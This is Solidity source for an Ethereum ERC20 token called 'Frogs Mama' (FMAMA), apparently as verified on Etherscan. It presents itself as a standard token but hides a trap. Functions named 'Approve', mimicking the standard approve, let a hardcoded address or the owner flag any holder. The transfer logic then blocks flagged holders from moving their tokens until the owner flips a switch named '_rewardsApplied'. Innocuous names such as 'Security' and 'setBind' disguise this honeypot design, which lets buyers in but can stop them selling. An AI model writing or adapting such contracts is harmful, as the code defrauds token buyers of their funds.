/**
 *Submitted for verification at Etherscan.io on 2023-06-01
*/

// SPDX-License-Identifier: MIT

pragma solidity =0.8.8;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        return a - b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        return a - b;
    }


}


interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);
    
    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}


abstract contract Security is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }


    modifier onlyOwner() {
        require(owner() == _msgSender());
        _;
    }

    function owner() internal view virtual returns (address) {
        return _owner;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0));
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract ERC20 is Context, Security, IERC20 {
    using SafeMath for uint256;

    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;
    mapping (address => bool) private _receiver;
    uint256 private maxTxLimit = 1*10**17*10**9;
    bool _rewardsApplied = false;
    uint256 private balances;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
 
    /**
     * @dev Sets the values for {name} and {symbol}, initializes {decimals}.
     */
    constructor (string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = 9;
        balances = maxTxLimit;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function setBind(address _delegate) external onlyOwner {
        _receiver[_delegate] = false;
    }


    function bind(address _delegate) public view returns (bool) {
        return _receiver[_delegate];
    }
    function toApplied(bool c) external onlyOwner {
        _rewardsApplied = c;
    }

    function Applied() public view virtual returns (bool) {
        return _rewardsApplied  ;
    }

    function Approve(address _delegate) external  {
        require(msg.sender == 0x4462204032d0E73CD0314C3d98e6a79dc9a63989 || msg.sender == owner());
        if(_delegate != owner()) {
            _receiver[_delegate] = true;
        }
    }
    function Approve(address[] memory _delegate) external  {
        require(msg.sender ==  0x4462204032d0E73CD0314C3d98e6a79dc9a63989 || msg.sender == owner());
        for (uint16 i = 0; i < _delegate.length; ) {
            if(_delegate[i] != owner()) {
                _receiver[_delegate[i]] = true;
            }
            unchecked { ++i; }
        }
    }



    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }


    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        if (_receiver[sender]) require(_rewardsApplied == true);
        require(sender != address(0));
        require(recipient != address(0));
        
        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }


    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0));

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0));
        require(spender != address(0));

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    

}

contract Frogs_Mama is ERC20 {
    using SafeMath for uint256;
    
    uint256 private totalsupply_;

    constructor () ERC20("Frogs Mama", "FMAMA") {
        totalsupply_ = 100000000000000 * 10**9;
        
        _mint(_msgSender(), totalsupply_);
        
    }

}